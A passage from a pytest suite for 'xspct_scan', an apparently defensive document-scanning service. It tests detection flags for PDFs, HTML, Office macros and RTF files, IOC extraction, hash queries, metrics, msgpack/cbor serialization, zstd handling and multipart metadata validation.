    def test_pdf_returns_correct_detected_type(self, daemon):
        r = daemon.sync_analyze("<t>", "test.pdf", PDF_ALL_MARKERS, "application/pdf")
        assert r["detected_type"] == "pdf"

    def test_pdf_has_correct_hash(self, daemon):
        r = daemon.sync_analyze("<t>", "test.pdf", PDF_CLEAN, "application/pdf")
        assert r["file_hash"] == hashlib.sha256(PDF_CLEAN).hexdigest()

    def test_pdf_flags_propagated(self, daemon):
        r = daemon.sync_analyze("<t>", "test.pdf", PDF_ALL_MARKERS, "application/pdf")
        assert r["has_javascript"] is True
        assert r["has_openaction"] is True

    def test_html_returns_correct_detected_type(self, daemon):
        r = daemon.sync_analyze("<t>", "test.html", HTML_MALICIOUS, "text/html")
        assert r["detected_type"] == "html"
        assert r["has_scripts"] is True

    def test_unknown_binary_has_report_keys(self, daemon):
        data = bytes(range(256))
        r = daemon.sync_analyze("<t>", "mystery.bin", data, "application/octet-stream")
        for key in ("file_hash", "detected_type", "analyses", "iocs", "text_preview"):
            assert key in r

    def test_meta_always_present(self, daemon):
        r = daemon.sync_analyze("<t>", "x.pdf", PDF_CLEAN, "application/pdf")
        assert r["meta"]["script_name"] == "xspct_scan"
        assert r["meta"]["version"] == xspct._ENGINE_VERSION

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    def test_real_ole_has_macro(self, daemon):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        r = daemon.sync_analyze(
            "<t>",
            "autostart-encrypt-standardpassword.xls",
            data,
            "application/vnd.ms-excel",
        )
        # File is encrypted; after in-memory decryption olevba may return has_macro=False
        # for XLM/stomped macros. Assert meaningful analysis was produced.
        assert (
            r["has_macro"] is True or r["decrypted"] is True or len(r["analyses"]) > 0
        )

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    def test_real_ole_has_ioc_urls(self, daemon):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        r = daemon.sync_analyze(
            "<t>",
            "autostart-encrypt-standardpassword.xls",
            data,
            "application/vnd.ms-excel",
        )
        iocs = r["iocs"]
        # This sample has no real network IOCs — only internal Office/VBA object
        # references (MSO.DLL, Excel.Sheet, etc.) that must NOT appear as domains
        # after TLD validation.  Verify the ioc keys exist and are clean lists.
        assert isinstance(iocs["urls"], list)
        assert isinstance(iocs["ips"], list)
        assert isinstance(iocs["domains"], list)
        assert not any("." not in d for d in iocs["domains"]), (
            "bare tokens must not appear"
        )

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    def test_real_ole_analyses_populated(self, daemon):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        r = daemon.sync_analyze(
            "<t>",
            "autostart-encrypt-standardpassword.xls",
            data,
            "application/vnd.ms-excel",
        )
        types = {a["type"] for a in r["analyses"]}
        assert "AutoExec" in types or "Suspicious" in types or len(types) > 0

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    def test_real_ole_with_custom_passwords(self, daemon):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        r = daemon.sync_analyze(
            "<t>",
            "autostart-encrypt-standardpassword.xls",
            data,
            "application/vnd.ms-excel",
            custom_passwords=["alpha", "beta", "123456"],
        )
        assert r["detected_type"] != ""

    @pytest.mark.skipif(not os.path.exists(RTF_FILE), reason="RTF sample not present")
    def test_real_rtf_analyzed(self, daemon):
        with open(RTF_FILE, "rb") as f:
            data = f.read()
        r = daemon.sync_analyze("<t>", "sample.rtf", data, "text/rtf")
        assert "file_hash" in r
        assert r["detected_type"] != ""


# ===========================================================================
# INTEGRATION TESTS
# ===========================================================================


class TestHealthPingRoot:
    async def test_health_200_ok(self, client):
        r = await client.get("/health")
        assert r.status == 200
        assert await r.text() == "OK"

    async def test_ping_200_pong(self, client):
        r = await client.get("/ping")
        assert r.status == 200
        assert await r.text() == "pong"

    async def test_root_200_xspct(self, client):
        r = await client.get("/")
        assert r.status == 200
        assert "xspct_scan" in await r.text()


class TestMetricsEndpoint:
    async def test_metrics_returns_prometheus_text(self, client):
        r = await client.get("/v1/metrics")
        assert r.status == 200
        text = await r.text()
        for metric in (
            "xspct_requests_total",
            "xspct_requests_finished",
            "xspct_requests_timeout",
            "xspct_redis_hits",
            "xspct_redis_misses",
            "xspct_redis_errors",
            "xspct_tasks_in_memory",
        ):
            assert metric in text

    async def test_metrics_request_counter_increments(self, client):
        await client.post("/v1/scan", data=_form(PDF_CLEAN, "a.pdf"))
        r = await client.get("/v1/metrics")
        text = await r.text()
        assert "xspct_requests_total 1" in text

    async def test_metrics_finished_counter_increments(self, client):
        await client.post("/v1/scan", data=_form(PDF_CLEAN, "b.pdf"))
        r = await client.get("/v1/metrics")
        text = await r.text()
        assert "xspct_requests_finished 1" in text

    async def test_metrics_tasks_in_memory_increases(self, client):
        await client.post("/v1/scan", data=_form(PDF_CLEAN, "c.pdf"))
        r = await client.get("/v1/metrics")
        text = await r.text()
        assert (
            "xspct_tasks_in_memory 0" not in text or "xspct_tasks_in_memory 1" in text
        )


class TestScanEndpoint:
    async def test_missing_doc_part_returns_400(self, client):
        form = aiohttp.FormData()
        form.add_field("not_doc", b"irrelevant", filename="x.bin")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 400

    async def test_scan_clean_pdf(self, client):
        r = await client.post("/v1/scan", data=_form(PDF_CLEAN, "clean.pdf"))
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"
        assert body["file"]["type"] == "pdf"
        assert body.get("flags", {}).get("javascript", False) is False
        assert body.get("flags", {}).get("open_action", False) is False

    async def test_scan_malicious_pdf_flags(self, client):
        r = await client.post("/v1/scan", data=_form(PDF_ALL_MARKERS, "malware.pdf"))
        assert r.status == 200
        body = await r.json()
        assert body.get("flags", {}).get("javascript", False) is True
        assert body.get("flags", {}).get("open_action", False) is True
        assert body.get("flags", {}).get("encrypted", False) is True

    async def test_scan_malicious_html_flags(self, client):
        r = await client.post("/v1/scan", data=_form(HTML_MALICIOUS, "phish.html"))
        assert r.status == 200
        body = await r.json()
        assert body["file"]["type"] == "html"
        assert body.get("flags", {}).get("scripts", False) is True
        assert body.get("flags", {}).get("forms", False) is True
        assert body.get("flags", {}).get("iframes", False) is True

    async def test_scan_ooxml_returns_200(self, client):
        r = await client.post("/v1/scan", data=_form(OOXML_DATA, "doc.docx"))
        assert r.status == 200
        body = await r.json()
        assert "schema_version" in body
        assert len(body["file"]["sha256"]) == 64  # SHA-256 hex

    async def test_scan_file_mime_override(self, client):
        form = aiohttp.FormData()
        form.add_field("doc", HTML_CLEAN, filename="noext")
        form.add_field("file_mime", "text/html")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 200
        body = await r.json()
        assert body["file"]["type"] == "html"

    async def test_scan_custom_passwords_accepted(self, client):
        form = aiohttp.FormData()
        form.add_field("doc", PDF_CLEAN, filename="doc.pdf")
        form.add_field("passwords", "pw1,pw2,TopSecret")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 200

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
    async def test_scan_encrypted_pdf_wrong_password(self, client):
        """Encrypted PDF with no matching password: report flags is_encrypted, decrypted=False."""
        form = aiohttp.FormData()
        form.add_field("doc", PDF_ENCRYPTED, filename="enc.pdf")
        form.add_field("passwords", "wrong1,wrong2")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 200
        body = await r.json()
        assert body.get("flags", {}).get("encrypted", False) is True
        assert body.get("flags", {}).get("decrypted", False) is False

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
    async def test_scan_encrypted_pdf_correct_password(self, client):
        """Encrypted PDF unlocked via the passwords field: decrypted=True."""
        form = aiohttp.FormData()
        form.add_field("doc", PDF_ENCRYPTED, filename="enc.pdf")
        form.add_field("passwords", f"wrong1,{_PDF_ENC_PASSWORD},wrong2")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 200
        body = await r.json()
        assert body["file"]["type"] == "pdf"
        assert body.get("flags", {}).get("decrypted", False) is True
        assert body.get("flags", {}).get("decryption_password") == _PDF_ENC_PASSWORD

    async def test_scan_time_taken_present(self, client):
        r = await client.post("/v1/scan", data=_form(PDF_CLEAN, "timed.pdf"))
        body = await r.json()
        assert "time_taken" in body
        assert body["time_taken"] >= 0

    async def test_scan_report_has_iocs_key(self, client):
        r = await client.post("/v1/scan", data=_form(PDF_WITH_URI, "ioc.pdf"))
        body = await r.json()
        assert "iocs" in body
        assert "urls" in body["iocs"]

    async def test_scan_same_file_produces_same_hash(self, client):
        """Same bytes always produce the same SHA-256 file_hash."""
        r1 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "a.pdf"))
        b1 = await r1.json()
        r2 = await client.post("/v1/scan", data=_form(PDF_CLEAN, "b.pdf"))
        b2 = await r2.json()
        assert b1["file"]["sha256"] == b2["file"]["sha256"]
        assert b1["file"]["sha256"] == hashlib.sha256(PDF_CLEAN).hexdigest()

    async def test_scan_short_timeout_may_return_202(self, client):
        """Very short timeout → 200 (fast path) or 202 (background). Both valid."""
        r = await client.post(
            "/v1/scan?timeout=0.00001", data=_form(PDF_ALL_MARKERS, "slow.pdf")
        )
        assert r.status in (200, 202)
        body = await r.json()
        assert "file_hash" in body or "status" in body

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    async def test_scan_real_ole_analysis(self, client):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        r = await client.post(
            "/v1/scan", data=_form(data, "autostart-encrypt-standardpassword.xls")
        )
        assert r.status == 200
        body = await r.json()
        assert (
            body.get("flags", {}).get("decrypted", False) is True
            or body.get("flags", {}).get("macros", False) is True
            or len(body.get("findings", [])) > 0
        )

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    async def test_scan_real_ole_has_ioc_urls(self, client):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        r = await client.post(
            "/v1/scan", data=_form(data, "autostart-encrypt-standardpassword.xls")
        )
        body = await r.json()
        iocs = body.get("iocs", {})
        # No real network IOCs in this sample — internal Office object references
        # (MSO.DLL, Excel.Sheet, etc.) are correctly filtered by TLD validation.
        assert isinstance(iocs.get("urls", []), list)
        assert isinstance(iocs.get("ips", []), list)
        assert isinstance(iocs.get("domains", []), list)

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    async def test_scan_ole_with_custom_passwords(self, client):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        form = aiohttp.FormData()
        form.add_field("doc", data, filename="autostart-encrypt-standardpassword.xls")
        form.add_field("passwords", "wrongpw1,wrongpw2,123456,VelvetSweatshop")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"

    @pytest.mark.skipif(not os.path.exists(RTF_FILE), reason="RTF sample not present")
    async def test_scan_real_rtf(self, client):
        with open(RTF_FILE, "rb") as f:
            data = f.read()
        r = await client.post("/v1/scan", data=_form(data, "sample.rtf"))
        assert r.status == 200
        body = await r.json()
        assert "schema_version" in body

    async def test_get_missing_hash_returns_400(self, client):
        r = await client.get("/v1/query")
        assert r.status == 400

    async def test_get_unknown_hash_returns_404(self, client):
        r = await client.get("/v1/query?hash=" + "a" * 64)
        assert r.status == 404

    async def test_post_missing_hash_returns_400(self, client):
        r = await client.post("/v1/query", json={})
        assert r.status == 400

    async def test_post_unknown_hash_returns_404(self, client):
        r = await client.post("/v1/query", json={"hash": "b" * 64})
        assert r.status == 404

    async def test_get_after_scan_returns_finished(self, client):
        scan_r = await client.post("/v1/scan", data=_form(PDF_CLEAN, "q.pdf"))
        scan_b = await scan_r.json()
        fhash = scan_b["file"]["sha256"]

        query_r = await client.get(f"/v1/query?hash={fhash}")
        assert query_r.status == 200
        query_b = await query_r.json()
        assert query_b["status"] == "finished"
        assert query_b["report"]["file"]["sha256"] == fhash
        assert query_b["report"]["file"]["type"] == "pdf"

    async def test_post_after_scan_returns_finished(self, client):
        scan_r = await client.post("/v1/scan", data=_form(HTML_CLEAN, "q.html"))
        scan_b = await scan_r.json()
        fhash = scan_b["file"]["sha256"]

        query_r = await client.post("/v1/query", json={"hash": fhash})
        assert query_r.status == 200
        query_b = await query_r.json()
        assert query_b["status"] == "finished"
        assert query_b["report"]["file"]["type"] == "html"

    @pytest.mark.skipif(not os.path.exists(OLE_FILE), reason="OLE sample not present")
    async def test_get_ole_report_after_scan(self, client):
        with open(OLE_FILE, "rb") as f:
            data = f.read()
        scan_r = await client.post(
            "/v1/scan", data=_form(data, "autostart-encrypt-standardpassword.xls")
        )
        scan_b = await scan_r.json()
        fhash = scan_b["file"]["sha256"]

        query_r = await client.get(f"/v1/query?hash={fhash}")
        assert query_r.status == 200
        query_b = await query_r.json()
        assert query_b["status"] == "finished"
        assert query_b["report"]["file"]["sha256"] == fhash


# ===========================================================================
# Response serialization (msgpack / cbor / config override)
# ===========================================================================

try:
    import msgpack as _msgpack_test

    _HAS_MSGPACK_TEST = True
except ImportError:
    _HAS_MSGPACK_TEST = False

try:
    import cbor2 as _cbor2_test

    _HAS_CBOR2_TEST = True
except ImportError:
    _HAS_CBOR2_TEST = False


@pytest.mark.skipif(not _HAS_MSGPACK_TEST, reason="msgpack not installed")
class TestResponseSerializationMsgpack:
    async def test_scan_accept_msgpack_returns_msgpack(self, client):
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={"Accept": "application/x-msgpack"},
        )
        assert r.status == 200
        assert "application/x-msgpack" in r.headers.get("Content-Type", "")
        body = _msgpack_test.unpackb(await r.read(), raw=False)
        assert body["status"] == "finished"
        assert body["file"]["type"] == "pdf"

    async def test_query_get_accept_msgpack_returns_msgpack(self, client):
        scan_r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={"Accept": "application/x-msgpack"},
        )
        file_hash = _msgpack_test.unpackb(await scan_r.read(), raw=False)["file"][
            "sha256"
        ]

        r = await client.get(
            f"/v1/query?hash={file_hash}",
            headers={"Accept": "application/x-msgpack"},
        )
        assert r.status == 200
        assert "application/x-msgpack" in r.headers.get("Content-Type", "")
        body = _msgpack_test.unpackb(await r.read(), raw=False)
        assert body["status"] == "finished"

    async def test_query_post_msgpack_body_returns_msgpack(self, client):
        scan_r = await client.post("/v1/scan", data=_form(PDF_CLEAN, "clean.pdf"))
        scan_b = await scan_r.json()
        file_hash = scan_b["file"]["sha256"]

        payload = _msgpack_test.packb({"hash": file_hash}, use_bin_type=True)
        r = await client.post(
            "/v1/query",
            data=payload,
            headers={"Content-Type": "application/x-msgpack"},
        )
        assert r.status == 200
        assert "application/x-msgpack" in r.headers.get("Content-Type", "")
        body = _msgpack_test.unpackb(await r.read(), raw=False)
        assert body["status"] == "finished"

    async def test_config_force_json_overrides_accept_msgpack(self, client):
        saved = xspct.config.get("xspct_response_format", "auto")
        xspct.config["xspct_response_format"] = "json"
        try:
            r = await client.post(
                "/v1/scan",
                data=_form(PDF_CLEAN, "clean.pdf"),
                headers={"Accept": "application/x-msgpack"},
            )
            assert r.status == 200
            assert r.headers.get("Content-Type", "").startswith("application/json")
            body = await r.json()
            assert body["status"] == "finished"
        finally:
            xspct.config["xspct_response_format"] = saved

    async def test_config_force_msgpack_overrides_json_accept(self, client):
        saved = xspct.config.get("xspct_response_format", "auto")
        xspct.config["xspct_response_format"] = "msgpack"
        try:
            r = await client.post(
                "/v1/scan",
                data=_form(PDF_CLEAN, "clean.pdf"),
                headers={"Accept": "application/json"},
            )
            assert r.status == 200
            assert "application/x-msgpack" in r.headers.get("Content-Type", "")
            body = _msgpack_test.unpackb(await r.read(), raw=False)
            assert body["status"] == "finished"
        finally:
            xspct.config["xspct_response_format"] = saved

    async def test_accept_qvalue_prefers_msgpack(self, client):
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={
                "Accept": "application/json;q=0.2, application/x-msgpack;q=0.8",
            },
        )
        assert r.status == 200
        assert "application/x-msgpack" in r.headers.get("Content-Type", "")
        assert r.headers.get("Vary", "") == "Accept, Accept-Encoding"
        body = _msgpack_test.unpackb(await r.read(), raw=False)
        assert body["status"] == "finished"

    async def test_accept_qvalue_zero_rejects_msgpack(self, client):
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={
                "Accept": "application/x-msgpack;q=0, application/json;q=1",
            },
        )
        assert r.status == 200
        assert r.headers.get("Content-Type", "").startswith("application/json")
        body = await r.json()
        assert body["status"] == "finished"


@pytest.mark.skipif(not _HAS_CBOR2_TEST, reason="cbor2 not installed")
class TestResponseSerializationCbor:
    async def test_scan_accept_cbor_returns_cbor(self, client):
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={"Accept": "application/cbor"},
        )
        assert r.status == 200
        assert "application/cbor" in r.headers.get("Content-Type", "")
        body = _cbor2_test.loads(await r.read())
        assert body["status"] == "finished"
        assert body["file"]["type"] == "pdf"

    async def test_query_get_accept_cbor_returns_cbor(self, client):
        scan_r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={"Accept": "application/cbor"},
        )
        file_hash = _cbor2_test.loads(await scan_r.read())["file"]["sha256"]

        r = await client.get(
            f"/v1/query?hash={file_hash}",
            headers={"Accept": "application/cbor"},
        )
        assert r.status == 200
        assert "application/cbor" in r.headers.get("Content-Type", "")
        body = _cbor2_test.loads(await r.read())
        assert body["status"] == "finished"

    async def test_query_post_cbor_body_returns_cbor(self, client):
        scan_r = await client.post("/v1/scan", data=_form(PDF_CLEAN, "clean.pdf"))
        scan_b = await scan_r.json()
        file_hash = scan_b["file"]["sha256"]

        payload = _cbor2_test.dumps({"hash": file_hash})
        r = await client.post(
            "/v1/query",
            data=payload,
            headers={"Content-Type": "application/cbor"},
        )
        assert r.status == 200
        assert "application/cbor" in r.headers.get("Content-Type", "")
        body = _cbor2_test.loads(await r.read())
        assert body["status"] == "finished"

    async def test_config_force_cbor_overrides_json_accept(self, client):
        saved = xspct.config.get("xspct_response_format", "auto")
        xspct.config["xspct_response_format"] = "cbor"
        try:
            r = await client.post(
                "/v1/scan",
                data=_form(PDF_CLEAN, "clean.pdf"),
                headers={"Accept": "application/json"},
            )
            assert r.status == 200
            assert "application/cbor" in r.headers.get("Content-Type", "")
            body = _cbor2_test.loads(await r.read())
            assert body["status"] == "finished"
        finally:
            xspct.config["xspct_response_format"] = saved


# ===========================================================================
# Zstd request decompression / response compression
# ===========================================================================

try:
    import zstandard as _zstd_test

    _HAS_ZSTD_TEST = True
except ImportError:
    _HAS_ZSTD_TEST = False


def _zstd_compress(data: bytes) -> bytes:
    return _zstd_test.ZstdCompressor().compress(data)


def _zstd_stream_decompress(data: bytes) -> bytes:
    dctx = _zstd_test.ZstdDecompressor()
    with dctx.stream_reader(io.BytesIO(data)) as reader:
        return reader.read()


@pytest.mark.skipif(not _HAS_ZSTD_TEST, reason="zstandard not installed")
class TestZstdCompression:
    # ------------------------------------------------------------------ #
    # Request decompression — multipart                                   #
    # ------------------------------------------------------------------ #

    async def test_multipart_zstd_doc_decompresses(self, client):
        """zstd-compressed doc part detected via magic bytes and decompressed."""
        compressed = _zstd_compress(PDF_CLEAN)
        r = await client.post("/v1/scan", data=_form(compressed, "clean.pdf"))
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"
        assert body["file"]["type"] == "pdf"

    async def test_multipart_malformed_zstd_returns_400(self, client):
        malformed = xspct._ZSTD_MAGIC + b"not-a-valid-zstd-frame"
        r = await client.post("/v1/scan", data=_form(malformed, "clean.pdf.zst"))
        assert r.status == 400
        body = await r.json()
        assert body["error"] == "Invalid zstd-compressed upload"

    async def test_multipart_zst_filename_suffix_stripped(self, client):
        compressed = _zstd_compress(PDF_CLEAN)
        r = await client.post("/v1/scan", data=_form(compressed, "clean.pdf.zst"))
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"
        reported_name = body.get("file", {}).get("name", "")
        assert not reported_name.lower().endswith(".zst")

    # ------------------------------------------------------------------ #
    # Request decompression — octet-stream                               #
    # ------------------------------------------------------------------ #

    async def test_octet_stream_zstd_magic_decompresses(self, client):
        """zstd magic bytes auto-detect on octet-stream body."""
        compressed = _zstd_compress(PDF_CLEAN)
        r = await client.post(
            "/v1/scan?filename=clean.pdf",
            data=compressed,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"
        assert body["file"]["type"] == "pdf"

    async def test_octet_stream_zst_filename_suffix_stripped(self, client):
        compressed = _zstd_compress(PDF_CLEAN)
        r = await client.post(
            "/v1/scan?filename=clean.pdf.zst",
            data=compressed,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"
        reported_name = body.get("file", {}).get("name", "")
        assert not reported_name.lower().endswith(".zst")

    async def test_octet_stream_zstd_over_limit_returns_413(self, client, monkeypatch):
        monkeypatch.setattr(xspct.InspectorDaemon, "_MAX_ZSTD_DECOMPRESSED_BYTES", 1024)
        compressed = _zstd_compress(b"A" * 2048)
        r = await client.post(
            "/v1/scan?filename=clean.pdf.zst",
            data=compressed,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert r.status == 413
        body = await r.json()
        assert (
            body["error"] == "Zstd-compressed upload expands beyond limit (1024 bytes)"
        )

    # ------------------------------------------------------------------ #
    # Response compression                                               #
    # ------------------------------------------------------------------ #

    async def test_accept_encoding_zstd_compresses_json_response(self, client):
        """Explicit Accept-Encoding: zstd triggers server-side compression.

        aiohttp client auto-decompresses the response body, so we read
        the result via r.json() and only verify the Content-Encoding header
        to confirm the server did compress.
        """
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={"Accept-Encoding": "zstd"},
        )
        assert r.status == 200
        assert r.headers.get("Content-Encoding", "") == "zstd"
        assert r.headers.get("Content-Type", "").startswith("application/json")
        assert r.headers.get("Vary", "") == "Accept, Accept-Encoding"
        # aiohttp client transparently decompresses when zstandard is installed
        result = await r.json()
        assert result["status"] == "finished"
        assert result["file"]["type"] == "pdf"

    async def test_accept_encoding_zstd_with_msgpack(self, client):
        if not _HAS_MSGPACK_TEST:
            pytest.skip("msgpack not installed")
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={
                "Accept": "application/x-msgpack",
                "Accept-Encoding": "zstd",
            },
        )
        assert r.status == 200
        assert r.headers.get("Content-Encoding", "") == "zstd"
        assert "application/x-msgpack" in r.headers.get("Content-Type", "")
        # aiohttp client decompresses zstd; r.read() returns plain msgpack bytes
        result = _msgpack_test.unpackb(await r.read(), raw=False)
        assert result["status"] == "finished"

    async def test_no_accept_encoding_no_compression(self, client):
        """Explicitly requesting gzip only must not trigger zstd compression."""
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            # Override aiohttp's automatic Accept-Encoding to exclude zstd
            headers={"Accept-Encoding": "gzip"},
        )
        assert r.status == 200
        assert r.headers.get("Content-Encoding", "") != "zstd"
        body = await r.json()
        assert body["status"] == "finished"

    async def test_accept_encoding_qvalue_zero_disables_zstd(self, client):
        r = await client.post(
            "/v1/scan",
            data=_form(PDF_CLEAN, "clean.pdf"),
            headers={"Accept-Encoding": "zstd;q=0, gzip;q=1"},
        )
        assert r.status == 200
        assert r.headers.get("Content-Encoding", "") != "zstd"
        body = await r.json()
        assert body["status"] == "finished"

    async def test_query_accept_encoding_zstd_compresses_response(self, client):
        scan_r = await client.post("/v1/scan", data=_form(PDF_CLEAN, "clean.pdf"))
        file_hash = (await scan_r.json())["file"]["sha256"]

        r = await client.get(
            f"/v1/query?hash={file_hash}",
            headers={"Accept-Encoding": "zstd"},
        )
        assert r.status == 200
        assert r.headers.get("Content-Encoding", "") == "zstd"
        # aiohttp client transparently decompresses
        result = await r.json()
        assert result["status"] == "finished"


# ===========================================================================
# Multipart upload with structured "metadata" + "file" parts
# ===========================================================================


def _metadata_form(
    filedata: bytes,
    filename: str,
    metadata: object,
    *,
    metadata_content_type: "str | None" = "application/json",
) -> aiohttp.FormData:
    """Build a multipart form with "metadata" + "file" parts."""
    form = aiohttp.FormData()
    if metadata_content_type in ("application/x-msgpack", "application/msgpack"):
        raw_metadata = _msgpack_test.packb(metadata, use_bin_type=True)
    else:
        raw_metadata = json.dumps(metadata).encode()
    if metadata_content_type:
        form.add_field(
            "metadata",
            io.BytesIO(raw_metadata),
            content_type=metadata_content_type,
        )
    else:
        form.add_field("metadata", io.BytesIO(raw_metadata))
    form.add_field("file", filedata, filename=filename)
    return form


def _raw_metadata_multipart(
    filedata: bytes,
    metadata: dict,
    *,
    transfer_encoding: "str | None" = None,
    metadata_transfer_encoding: "str | None" = None,
    file_first: bool = False,
) -> tuple[bytes, dict[str, str]]:
    """Build a structured multipart body with explicit part ordering/encoding."""
    boundary = "xspct-test-boundary"
    encoded_file = filedata
    transfer_header = b""
    if transfer_encoding == "base64":
        encoded_file = base64.b64encode(filedata)
        transfer_header = b"Content-Transfer-Encoding: base64\r\n"
    elif transfer_encoding == "quoted-printable":
        encoded_file = quopri.encodestring(filedata)
        transfer_header = b"Content-Transfer-Encoding: quoted-printable\r\n"

    raw_metadata = json.dumps(metadata).encode()
    metadata_transfer_header = b""
    if metadata_transfer_encoding == "base64":
        raw_metadata = base64.b64encode(raw_metadata)
        metadata_transfer_header = b"Content-Transfer-Encoding: base64\r\n"
    metadata_part = (
        (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="metadata"\r\n'
            "Content-Type: application/json\r\n"
        ).encode()
        + metadata_transfer_header
        + b"\r\n"
        + raw_metadata
        + b"\r\n"
    )
    file_part = (
        (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="file"; filename="clean.pdf"\r\n'
            "Content-Type: application/octet-stream\r\n"
        ).encode()
        + transfer_header
        + b"\r\n"
        + encoded_file
        + b"\r\n"
    )
    parts = (file_part, metadata_part) if file_first else (metadata_part, file_part)
    body = b"".join(parts) + f"--{boundary}--\r\n".encode()
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    return body, headers


class TestScanMultipartMetadata:
    async def test_metadata_json_scan_returns_200(self, client):
        r = await client.post(
            "/v1/scan", data=_metadata_form(PDF_CLEAN, "clean.pdf", {})
        )
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"
        assert body["file"]["type"] == "pdf"

    @pytest.mark.skipif(not _HAS_MSGPACK_TEST, reason="msgpack not installed")
    async def test_metadata_msgpack_scan_returns_200(self, client):
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(
                PDF_CLEAN,
                "clean.pdf",
                {},
                metadata_content_type="application/x-msgpack",
            ),
        )
        assert r.status == 200
        body = await r.json()
        assert body["status"] == "finished"
        assert body["file"]["type"] == "pdf"

    async def test_metadata_no_content_type_falls_back_to_json(self, client):
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(PDF_CLEAN, "clean.pdf", {}, metadata_content_type=None),
        )
        assert r.status == 200
        body = await r.json()
        assert body["file"]["type"] == "pdf"

    async def test_metadata_missing_file_part_returns_400(self, client):
        form = aiohttp.FormData()
        form.add_field(
            "metadata",
            io.BytesIO(json.dumps({}).encode()),
            content_type="application/json",
        )
        r = await client.post("/v1/scan", data=form)
        assert r.status == 400
        body = await r.json()
        assert "file" in body["error"]

    async def test_metadata_invalid_json_returns_400(self, client):
        form = aiohttp.FormData()
        form.add_field(
            "metadata", io.BytesIO(b"{not valid json"), content_type="application/json"
        )
        form.add_field("file", PDF_CLEAN, filename="clean.pdf")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 400

    @pytest.mark.parametrize("metadata", [[], "text", None])
    async def test_metadata_must_be_an_object(self, client, metadata):
        r = await client.post(
            "/v1/scan", data=_metadata_form(PDF_CLEAN, "clean.pdf", metadata)
        )
        assert r.status == 400
        body = await r.json()
        assert "object" in body["error"]

    @pytest.mark.parametrize(
        ("field", "value"),
        [
            ("rspamd_uid", 123),
            ("passwords", "secret"),
            ("force_analyzers", ["image.ocr", 123]),
            ("timeout_s", "soon"),
            ("timeout_s", 0),
        ],
    )
    async def test_metadata_rejects_invalid_field_types(self, client, field, value):
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(PDF_CLEAN, "clean.pdf", {field: value}),
        )
        assert r.status == 400
        body = await r.json()
        assert field in body["error"]

    async def test_file_without_metadata_returns_400(self, client):
        form = aiohttp.FormData()
        form.add_field("file", PDF_CLEAN, filename="clean.pdf")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 400
        body = await r.json()
        assert "metadata" in body["error"]

    async def test_mixed_multipart_shapes_return_400(self, client):
        form = _metadata_form(PDF_CLEAN, "clean.pdf", {})
        form.add_field("doc", PDF_CLEAN, filename="legacy.pdf")
        r = await client.post("/v1/scan", data=form)
        assert r.status == 400
        body = await r.json()
        assert "cannot be mixed" in body["error"]

    async def test_empty_force_analyzers_overrides_query(self, client, monkeypatch):
        captured = {}

        async def fake_analyze_task(*args, **_kwargs):
            captured["force_analyzers"] = args[-1]
            return {}

        daemon = client.server.app["daemon"]
        monkeypatch.setattr(daemon, "analyze_task", fake_analyze_task)
        r = await client.post(
            "/v1/scan?force_analyzers=image.ocr",
            data=_metadata_form(PDF_CLEAN, "clean.pdf", {"force_analyzers": []}),
        )
        assert r.status == 200
        assert captured["force_analyzers"] == frozenset()

    async def test_metadata_filename_overrides_part_filename(self, client):
        r = await client.post(
            "/v1/scan",
            data=_metadata_form(PDF_CLEAN, "upload.bin", {"filename": "invoice.pdf"}),
        )
        assert r.status == 200
        body = await r.json()
